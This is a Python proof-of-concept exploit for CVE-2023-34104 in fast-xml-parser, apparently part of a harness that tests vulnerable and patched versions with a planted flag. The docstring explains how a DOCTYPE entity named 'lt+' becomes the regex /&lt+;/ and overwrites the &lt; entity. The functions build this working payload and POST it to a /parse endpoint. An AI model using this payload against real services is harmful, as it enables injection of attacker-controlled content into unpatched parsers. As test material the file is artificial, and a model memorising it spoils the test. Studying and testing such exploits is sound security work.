#!/usr/bin/env python3
"""[GIVEN] CVE-2023-34104 seed exploit for fastxmlparser_entityname_regex_injection (external HTTP).

The classic fast-xml-parser DOCTYPE entity-name regex-injection vector, delivered over a real HTTP
POST to the service's `/parse` endpoint (`new XMLParser({processEntities:true}).parse(req.body)`).

fast-xml-parser resolves DOCTYPE-defined entities by building, for each entity NAME, a replacement
`RegExp(`&${entityName};`,"g")` in src/xmlparser/DocTypeReader.js and running it over element text
in OrderedObjParser.replaceEntitiesValue() -- and it does so BEFORE the built-in XML entities
(&lt; &gt; &amp; &quot; &apos;) are decoded. The entity NAME is interpolated UNESCAPED, so a regex
metacharacter in the NAME turns the pattern into one that MATCHES a built-in entity reference and
OVERWRITES it with the attacker-controlled DOCTYPE entity VALUE.

The seed declares an entity whose NAME is `lt+` -- the trailing '+' is a regex quantifier, so the
built RegExp is /&lt+;/, which matches the body's `&lt;` and replaces it with the entity value
(here the planted ${PCB_FLAG} token). The parsed <r> field then equals the flag instead of "<".

    <?xml version="1.0"?>
    <!DOCTYPE r [
    <!ENTITY lt+ "${FLAG}">          # entity NAME 'lt+' -> RegExp /&lt+;/ (the '+' quantifier)
    ]>
    <r>&lt;</r>                       # &lt; is shadowed and overwritten by ${FLAG}

On V0 (fast-xml-parser 4.2.3) the entity-name blocklist lacks '+' so 'lt+' passes -> /&lt+;/
shadows &lt; -> the flag surfaces in the /parse response (REACHES). On V1 (4.2.4, the
CVE-2023-34104 fix) the blocklist was widened to include '+' -> validateEntityName now throws
"Invalid character + in entity name" BEFORE any RegExp is built -> no flag (BLOCKED). The block on
V1 is exactly the entity-name blocklist widening that the CVE-2023-34104 fix added to this sink.
"""
from poc_common import post_parse


def original_payload(flag: str) -> str:
    return (
        '<?xml version="1.0"?>\n'
        '<!DOCTYPE r [\n'
        '<!ENTITY lt+ "%s">\n'
        ']>\n'
        '<r>&lt;</r>' % flag
    )


def candidate(flag: str) -> dict:
    return {
        "id": "cve-2023-34104-entityname-lt-plus-seed",
        "payload": original_payload(flag),
    }


def original_poc(flag: str, *, version: str = "v1") -> dict:
    """Send the CVE-2023-34104 seed XML to `version` over external HTTP; return the JSON response."""
    return post_parse(original_payload(flag), version)


if __name__ == "__main__":
    print(original_payload("PCBFLAG_demo"))
